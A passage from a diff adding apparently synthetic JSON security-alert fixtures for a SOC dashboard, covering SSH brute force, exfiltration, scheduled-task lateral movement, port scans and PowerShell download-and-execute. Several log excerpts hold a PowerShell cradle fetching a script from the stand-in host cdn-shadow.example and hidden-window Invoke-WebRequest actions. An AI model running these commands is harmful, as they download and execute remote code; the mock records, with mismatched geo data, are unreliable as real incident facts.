+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 15,
+      "last_7_days": 3,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "张晨",
+      "updated_at": "2026-04-14T02:20:00",
+      "response_minutes": 38
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-02",
+      "ip": "10.0.2.15",
+      "owner": "安全运营中心",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T01:43:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-14T01:51:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-14T01:55:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0027",
+    "title": "异常大流量数据外传 #27",
+    "source": "elk",
+    "severity": "critical",
+    "status": "resolved",
+    "timestamp": "2026-04-14T01:38:00",
+    "rule_name": "NET-Abnormal-Exfiltration",
+    "description": "财务系统服务器在非办公时间向陌生云存储地址持续上传压缩文件。",
+    "log_excerpt": "TLS upload session to report-archive node, stream chunks=248, compressed=true, bytes=184923410",
+    "source_ip": "91.214.124.75",
+    "destination_ip": "10.0.5.22",
+    "source_geo": {
+      "region": "东亚",
+      "country": "日本",
+      "city": "东京",
+      "latitude": 35.6762,
+      "longitude": 139.6503
+    },
+    "event_type": "可疑外连",
+    "request_content": "PUT /archive/2026/q2/report-pack-14.tar.gz HTTP/1.1\nHost: report-archive.example\nContent-Length: 184923410\nX-Transfer-Mode: bulk-sync",
+    "packet_details": {
+      "protocol": "TLS",
+      "request_method": "PUT",
+      "request_uri": "/archive/2026/q2/report-pack-14.tar.gz",
+      "source_port": 51770,
+      "destination_port": 443,
+      "packet_size": 4133,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "1f 8b 08 00 00 00 00 00 02 ff ec bd 79 7c 14 c5 ..."
+    },
+    "threat_type": "exfiltration",
+    "attack_stage": "Exfiltration",
+    "related_rule_ids": [
+      "RULE-003",
+      "RULE-005"
+    ],
+    "hardening_suggestions": [
+      "限制敏感服务器对外上传目的地",
+      "为数据出口启用 DLP 审计",
+      "对非业务时段大流量传输设置自动阻断"
+    ],
+    "similar_incidents": {
+      "total": 16,
+      "last_7_days": 4,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "李岳",
+      "updated_at": "2026-04-14T02:03:00",
+      "response_minutes": 44
+    },
+    "mitre_tactics": [
+      "Collection",
+      "Exfiltration"
+    ],
+    "asset": {
+      "hostname": "asset-03",
+      "ip": "10.0.5.22",
+      "owner": "研发一部",
+      "environment": "test"
+    },
+    "related_entities": [
+      "finance-app-01",
+      "report-archive",
+      "s3-transfer-gw"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T01:26:00",
+        "message": "检测到异常上传连接"
+      },
+      {
+        "timestamp": "2026-04-14T01:34:00",
+        "message": "传输体积快速上升"
+      },
+      {
+        "timestamp": "2026-04-14T01:38:00",
+        "message": "命中夜间传输告警阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0028",
+    "title": "计划任务横向下发异常 #28",
+    "source": "wazuh",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T01:21:00",
+    "rule_name": "WIN-Remote-Task-Creation",
+    "description": "域内管理主机对多台终端批量创建计划任务，任务内容与标准运维基线不一致。",
+    "log_excerpt": "Remote task creation RPC request -> task=update, schedule=minute, user=svc-backup, cmd=powershell.exe -w hidden",
+    "source_ip": "103.77.182.16",
+    "destination_ip": "10.0.8.90",
+    "source_geo": {
+      "region": "东欧",
+      "country": "俄罗斯",
+      "city": "莫斯科",
+      "latitude": 55.7558,
+      "longitude": 37.6173
+    },
+    "event_type": "漏洞利用",
+    "request_content": "RPC Task Scheduler CreateTask -> target=ws-224, action=powershell.exe -w hidden -nop -c Invoke-WebRequest",
+    "packet_details": {
+      "protocol": "RPC",
+      "request_method": "CreateTask",
+      "request_uri": "rpc://ws-224/tasks",
+      "source_port": 49915,
+      "destination_port": 445,
+      "packet_size": 1610,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "TaskName=WindowsUpdateCheck\nTrigger=Minute/1\nAction=powershell.exe -w hidden -nop"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Command and Control",
+    "related_rule_ids": [
+      "RULE-004",
+      "RULE-006"
+    ],
+    "hardening_suggestions": [
+      "收敛远程任务创建权限",
+      "审计高权限服务账号使用轨迹",
+      "对隐藏窗口 PowerShell 命令设置拦截规则"
+    ],
+    "similar_incidents": {
+      "total": 8,
+      "last_7_days": 5,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "王琪",
+      "updated_at": "2026-04-14T01:46:00",
+      "response_minutes": 50
+    },
+    "mitre_tactics": [
+      "Lateral Movement",
+      "Persistence"
+    ],
+    "asset": {
+      "hostname": "asset-04",
+      "ip": "10.0.8.90",
+      "owner": "财务系统组",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "svc-backup",
+      "ops-jump-01",
+      "ws-224"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T01:09:00",
+        "message": "检测到远程计划任务下发"
+      },
+      {
+        "timestamp": "2026-04-14T01:17:00",
+        "message": "任务命令与基线不符"
+      },
+      {
+        "timestamp": "2026-04-14T01:21:00",
+        "message": "受影响终端数量持续增加"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0029",
+    "title": "端口扫描探测 #29",
+    "source": "suricata",
+    "severity": "medium",
+    "status": "investigating",
+    "timestamp": "2026-04-14T01:04:00",
+    "rule_name": "NET-Port-Scan-Fanout",
+    "description": "单个外部地址对内网多个网段进行快速端口枚举，覆盖常见管理端口。",
+    "log_excerpt": "TCP SYN burst to subnet 10.0.5.0/24 over 22,80,443,3389, fanout=28",
+    "source_ip": "176.65.148.211",
+    "destination_ip": "10.1.1.18",
+    "source_geo": {
+      "region": "南亚",
+      "country": "印度",
+      "city": "孟买",
+      "latitude": 19.076,
+      "longitude": 72.8777
+    },
+    "event_type": "端口扫描",
+    "request_content": "TCP SYN scan burst detected against 10.0.5.0/24 ports 22,80,443,3389",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "SYN",
+      "request_uri": "scan://10.0.5.0/24",
+      "source_port": 42145,
+      "destination_port": 3389,
+      "packet_size": 239,
+      "tcp_flags": "SYN",
+      "payload_preview": "No payload. Repeated SYN packets with incremental destination port fanout."
+    },
+    "threat_type": "port-scan",
+    "attack_stage": "Reconnaissance",
+    "related_rule_ids": [
+      "RULE-005",
+      "RULE-001"
+    ],
+    "hardening_suggestions": [
+      "在边界启用扫描速率限制",
+      "将非常见来源纳入威胁情报封禁",
+      "对暴露服务进行最小化开放"
+    ],
+    "similar_incidents": {
+      "total": 9,
+      "last_7_days": 2,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-14T01:29:00",
+      "response_minutes": 56
+    },
+    "mitre_tactics": [
+      "Reconnaissance",
+      "Discovery"
+    ],
+    "asset": {
+      "hostname": "asset-05",
+      "ip": "10.1.1.18",
+      "owner": "基础设施组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "scanner-node",
+      "edge-fw-01",
+      "10.0.5.0/24"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T00:52:00",
+        "message": "扫描开始"
+      },
+      {
+        "timestamp": "2026-04-14T01:00:00",
+        "message": "端口覆盖范围扩大"
+      },
+      {
+        "timestamp": "2026-04-14T01:04:00",
+        "message": "频率达到封禁阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0030",
+    "title": "异常登录地理偏移 #30",
+    "source": "elk",
+    "severity": "medium",
+    "status": "resolved",
+    "timestamp": "2026-04-14T00:47:00",
+    "rule_name": "IAM-Improbable-Travel",
+    "description": "同一账号在 20 分钟内先后出现在两个地理位置差异较大的登录事件中。",
+    "log_excerpt": "Account sign-in from Singapore then Frankfurt within 20 minutes for user zhangsan",
+    "source_ip": "45.142.214.8",
+    "destination_ip": "172.16.4.20",
+    "source_geo": {
+      "region": "南美",
+      "country": "巴西",
+      "city": "圣保罗",
+      "latitude": -23.5505,
+      "longitude": -46.6333
+    },
+    "event_type": "异常登录",
+    "request_content": "POST /api/auth/signin HTTP/1.1\nHost: sso.example\nX-Geo: Frankfurt\nX-User: zhangsan",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/api/auth/signin",
+      "source_port": 50243,
+      "destination_port": 443,
+      "packet_size": 1358,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "username=zhangsan&grant_type=password&device=unknown-browser"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-006",
+      "RULE-002"
+    ],
+    "hardening_suggestions": [
+      "对高风险登录强制二次校验",
+      "梳理账号共享与代维场景",
+      "针对异地登录启用条件访问策略"
+    ],
+    "similar_incidents": {
+      "total": 10,
+      "last_7_days": 3,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-14T01:12:00",
+      "response_minutes": 62
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Valid Accounts"
+    ],
+    "asset": {
+      "hostname": "asset-06",
+      "ip": "172.16.4.20",
+      "owner": "数据平台组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "zhangsan",
+      "vpn-gateway",
+      "m365-portal"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T00:35:00",
+        "message": "新加坡登录成功"
+      },
+      {
+        "timestamp": "2026-04-14T00:43:00",
+        "message": "法兰克福登录出现"
+      },
+      {
+        "timestamp": "2026-04-14T00:47:00",
+        "message": "触发异地登录规则"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0031",
+    "title": "PowerShell 下载执行异常 #31",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-14T00:30:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "100.20.10.5",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "华北",
+      "country": "中国",
+      "city": "北京",
+      "latitude": 39.9042,
+      "longitude": 116.4074
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49852,
+      "destination_port": 443,
+      "packet_size": 2846,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 11,
+      "last_7_days": 4,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "张晨",
+      "updated_at": "2026-04-14T00:55:00",
+      "response_minutes": 8
+    },
+    "mitre_tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-07",
+      "ip": "10.0.0.30",
+      "owner": "安全运营中心",
+      "environment": "test"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T00:18:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-14T00:26:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-14T00:30:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0032",
+    "title": "SSH 暴力破解尝试 #32",
+    "source": "suricata",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T00:13:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "185.233.44.12",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "华东",
+      "country": "中国",
+      "city": "上海",
+      "latitude": 31.2304,
+      "longitude": 121.4737
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53149,
+      "destination_port": 22,
+      "packet_size": 949,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 12,
+      "last_7_days": 5,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "李岳",
+      "updated_at": "2026-04-14T00:38:00",
+      "response_minutes": 14
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-08",
+      "ip": "10.0.2.15",
+      "owner": "研发一部",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T00:01:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-14T00:09:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-14T00:13:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0033",
+    "title": "异常大流量数据外传 #33",
+    "source": "elk",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-13T23:56:00",
+    "rule_name": "NET-Abnormal-Exfiltration",
+    "description": "财务系统服务器在非办公时间向陌生云存储地址持续上传压缩文件。",
+    "log_excerpt": "TLS upload session to report-archive node, stream chunks=248, compressed=true, bytes=184923410",
+    "source_ip": "45.83.91.201",
+    "destination_ip": "10.0.5.22",
+    "source_geo": {
+      "region": "华南",
+      "country": "中国",
+      "city": "深圳",
+      "latitude": 22.5431,
+      "longitude": 114.0579
+    },
+    "event_type": "可疑外连",
+    "request_content": "PUT /archive/2026/q2/report-pack-14.tar.gz HTTP/1.1\nHost: report-archive.example\nContent-Length: 184923410\nX-Transfer-Mode: bulk-sync",
+    "packet_details": {
+      "protocol": "TLS",
+      "request_method": "PUT",
+      "request_uri": "/archive/2026/q2/report-pack-14.tar.gz",
+      "source_port": 51776,
+      "destination_port": 443,
+      "packet_size": 4170,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "1f 8b 08 00 00 00 00 00 02 ff ec bd 79 7c 14 c5 ..."
+    },
+    "threat_type": "exfiltration",
+    "attack_stage": "Exfiltration",
+    "related_rule_ids": [
+      "RULE-003",
+      "RULE-005"
+    ],
+    "hardening_suggestions": [
+      "限制敏感服务器对外上传目的地",
+      "为数据出口启用 DLP 审计",
+      "对非业务时段大流量传输设置自动阻断"
+    ],
+    "similar_incidents": {
+      "total": 13,
+      "last_7_days": 2,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "王琪",
+      "updated_at": "2026-04-14T00:21:00",
+      "response_minutes": 20
+    },
+    "mitre_tactics": [
+      "Collection",
+      "Exfiltration"
+    ],
+    "asset": {
+      "hostname": "asset-09",
+      "ip": "10.0.5.22",
+      "owner": "财务系统组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "finance-app-01",
+      "report-archive",
+      "s3-transfer-gw"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T23:44:00",
+        "message": "检测到异常上传连接"
+      },
+      {
+        "timestamp": "2026-04-13T23:52:00",
+        "message": "传输体积快速上升"
+      },
+      {
+        "timestamp": "2026-04-13T23:56:00",
+        "message": "命中夜间传输告警阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0034",
+    "title": "计划任务横向下发异常 #34",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "investigating",
+    "timestamp": "2026-04-13T23:39:00",
+    "rule_name": "WIN-Remote-Task-Creation",
+    "description": "域内管理主机对多台终端批量创建计划任务，任务内容与标准运维基线不一致。",
+    "log_excerpt": "Remote task creation RPC request -> task=update, schedule=minute, user=svc-backup, cmd=powershell.exe -w hidden",
+    "source_ip": "62.171.173.40",
+    "destination_ip": "10.0.8.90",
+    "source_geo": {
+      "region": "北美",
+      "country": "美国",
+      "city": "洛杉矶",
+      "latitude": 34.0522,
+      "longitude": -118.2437
+    },
+    "event_type": "漏洞利用",
+    "request_content": "RPC Task Scheduler CreateTask -> target=ws-224, action=powershell.exe -w hidden -nop -c Invoke-WebRequest",
+    "packet_details": {
+      "protocol": "RPC",
+      "request_method": "CreateTask",
+      "request_uri": "rpc://ws-224/tasks",
+      "source_port": 49921,
+      "destination_port": 445,
+      "packet_size": 1647,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "TaskName=WindowsUpdateCheck\nTrigger=Minute/1\nAction=powershell.exe -w hidden -nop"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Command and Control",
+    "related_rule_ids": [
+      "RULE-004",
+      "RULE-006"
+    ],
+    "hardening_suggestions": [
+      "收敛远程任务创建权限",
+      "审计高权限服务账号使用轨迹",
+      "对隐藏窗口 PowerShell 命令设置拦截规则"
+    ],
+    "similar_incidents": {
+      "total": 14,
+      "last_7_days": 3,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-14T00:04:00",
+      "response_minutes": 26
+    },
+    "mitre_tactics": [
+      "Lateral Movement",
+      "Persistence"
+    ],
+    "asset": {
+      "hostname": "asset-10",
+      "ip": "10.0.8.90",
+      "owner": "基础设施组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-backup",
+      "ops-jump-01",
+      "ws-224"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T23:27:00",
+        "message": "检测到远程计划任务下发"
+      },
+      {
+        "timestamp": "2026-04-13T23:35:00",
+        "message": "任务命令与基线不符"
+      },
+      {
+        "timestamp": "2026-04-13T23:39:00",
+        "message": "受影响终端数量持续增加"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0035",
+    "title": "端口扫描探测 #35",
+    "source": "suricata",
+    "severity": "medium",
+    "status": "new",
+    "timestamp": "2026-04-13T23:22:00",
+    "rule_name": "NET-Port-Scan-Fanout",
+    "description": "单个外部地址对内网多个网段进行快速端口枚举，覆盖常见管理端口。",
+    "log_excerpt": "TCP SYN burst to subnet 10.0.5.0/24 over 22,80,443,3389, fanout=28",
+    "source_ip": "203.55.18.91",
+    "destination_ip": "10.1.1.18",
+    "source_geo": {
+      "region": "欧洲",
+      "country": "德国",
+      "city": "法兰克福",
+      "latitude": 50.1109,
+      "longitude": 8.6821
+    },
+    "event_type": "端口扫描",
+    "request_content": "TCP SYN scan burst detected against 10.0.5.0/24 ports 22,80,443,3389",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "SYN",
+      "request_uri": "scan://10.0.5.0/24",
+      "source_port": 42151,
+      "destination_port": 3389,
+      "packet_size": 276,
+      "tcp_flags": "SYN",
+      "payload_preview": "No payload. Repeated SYN packets with incremental destination port fanout."
+    },
+    "threat_type": "port-scan",
+    "attack_stage": "Reconnaissance",
+    "related_rule_ids": [
+      "RULE-005",
+      "RULE-001"
+    ],
+    "hardening_suggestions": [
+      "在边界启用扫描速率限制",
+      "将非常见来源纳入威胁情报封禁",
+      "对暴露服务进行最小化开放"
+    ],
+    "similar_incidents": {
+      "total": 15,
+      "last_7_days": 4,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-13T23:47:00",
+      "response_minutes": 32
+    },
+    "mitre_tactics": [
+      "Reconnaissance",
+      "Discovery"
+    ],
+    "asset": {
+      "hostname": "asset-11",
+      "ip": "10.1.1.18",
+      "owner": "数据平台组",
+      "environment": "test"
+    },
+    "related_entities": [
+      "scanner-node",
+      "edge-fw-01",
+      "10.0.5.0/24"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T23:10:00",
+        "message": "扫描开始"
+      },
+      {
+        "timestamp": "2026-04-13T23:18:00",
+        "message": "端口覆盖范围扩大"
+      },
+      {
+        "timestamp": "2026-04-13T23:22:00",
+        "message": "频率达到封禁阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0036",
+    "title": "异常登录地理偏移 #36",
+    "source": "elk",
+    "severity": "medium",
+    "status": "investigating",
+    "timestamp": "2026-04-13T23:05:00",
+    "rule_name": "IAM-Improbable-Travel",
+    "description": "同一账号在 20 分钟内先后出现在两个地理位置差异较大的登录事件中。",
+    "log_excerpt": "Account sign-in from Singapore then Frankfurt within 20 minutes for user zhangsan",
+    "source_ip": "198.51.100.22",
+    "destination_ip": "172.16.4.20",
+    "source_geo": {
+      "region": "东南亚",
+      "country": "新加坡",
+      "city": "新加坡",
+      "latitude": 1.3521,
+      "longitude": 103.8198
+    },
+    "event_type": "异常登录",
+    "request_content": "POST /api/auth/signin HTTP/1.1\nHost: sso.example\nX-Geo: Frankfurt\nX-User: zhangsan",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/api/auth/signin",
+      "source_port": 50249,
+      "destination_port": 443,
+      "packet_size": 1210,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "username=zhangsan&grant_type=password&device=unknown-browser"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-006",
+      "RULE-002"
+    ],
+    "hardening_suggestions": [
+      "对高风险登录强制二次校验",
+      "梳理账号共享与代维场景",
+      "针对异地登录启用条件访问策略"
+    ],
+    "similar_incidents": {
+      "total": 16,
+      "last_7_days": 5,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "张晨",
+      "updated_at": "2026-04-13T23:30:00",
+      "response_minutes": 38
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Valid Accounts"
+    ],
+    "asset": {
+      "hostname": "asset-12",
+      "ip": "172.16.4.20",
+      "owner": "安全运营中心",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "zhangsan",
+      "vpn-gateway",
+      "m365-portal"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T22:53:00",
+        "message": "新加坡登录成功"
+      },
+      {
+        "timestamp": "2026-04-13T23:01:00",
+        "message": "法兰克福登录出现"
+      },
+      {
+        "timestamp": "2026-04-13T23:05:00",
+        "message": "触发异地登录规则"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0037",
+    "title": "PowerShell 下载执行异常 #37",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-13T22:48:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "91.214.124.75",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "东亚",
+      "country": "日本",
+      "city": "东京",
+      "latitude": 35.6762,
+      "longitude": 139.6503
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49858,
+      "destination_port": 443,
+      "packet_size": 2883,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 8,
+      "last_7_days": 2,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "李岳",
+      "updated_at": "2026-04-13T23:13:00",
+      "response_minutes": 44
+    },
+    "mitre_tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-01",
+      "ip": "10.0.0.30",
+      "owner": "研发一部",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T22:36:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-13T22:44:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-13T22:48:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0038",
+    "title": "SSH 暴力破解尝试 #38",
+    "source": "suricata",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-13T22:31:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "103.77.182.16",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "东欧",
+      "country": "俄罗斯",
+      "city": "莫斯科",
+      "latitude": 55.7558,
+      "longitude": 37.6173
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53155,
+      "destination_port": 22,
+      "packet_size": 986,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 9,
+      "last_7_days": 3,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "王琪",
+      "updated_at": "2026-04-13T22:56:00",
+      "response_minutes": 50
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-02",
+      "ip": "10.0.2.15",
+      "owner": "财务系统组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-13T22:19:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-13T22:27:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-13T22:31:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0039",
+    "title": "异常大流量数据外传 #39",
+    "source": "elk",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-13T22:14:00",
+    "rule_name": "NET-Abnormal-Exfiltration",
+    "description": "财务系统服务器在非办公时间向陌生云存储地址持续上传压缩文件。",
+    "log_excerpt": "TLS upload session to report-archive node, stream chunks=248, compressed=true, bytes=184923410",
+    "source_ip": "176.65.148.211",
+    "destination_ip": "10.0.5.22",
+    "source_geo": {
+      "region": "南亚",
+      "country": "印度",
+      "city": "孟买",
+      "latitude": 19.076,
+      "longitude": 72.8777
+    },
+    "event_type": "可疑外连",
+    "request_content": "PUT /archive/2026/q2/report-pack-14.tar.gz HTTP/1.1\nHost: report-archive.example\nContent-Length: 184923410\nX-Transfer-Mode: bulk-sync",
+    "packet_details": {
+      "protocol": "TLS",
+      "request_method": "PUT",
+      "request_uri": "/archive/2026/q2/report-pack-14.tar.gz",
